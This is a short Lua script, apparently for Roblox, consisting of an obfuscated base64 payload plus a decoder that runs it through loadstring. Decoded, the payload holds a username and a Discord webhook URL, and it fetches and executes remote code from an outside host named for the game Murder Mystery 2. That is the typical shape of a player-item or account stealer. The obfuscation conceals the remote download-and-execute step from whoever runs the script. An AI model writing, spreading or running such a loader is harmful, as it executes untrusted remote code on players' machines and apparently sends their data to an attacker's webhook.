
-- Obfuscated script
local encodedScript = "VXNlcm5hbWUgPSAiRkVERU9OQkxPWFNVUzMiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MDc4NzU2MjI1MTQyMzkyNS8wbm50X1BhdDdCWW1LSWppaldqWW8tRlkyRkZwdFg2b1h1Y0tnWXFneWlBZ24wNVJ0MTRWR3VWS0ZzWWl0YUhMZ1RzRyIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwOi8vZWtzb3ZhLnh5ei9NTTIiLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
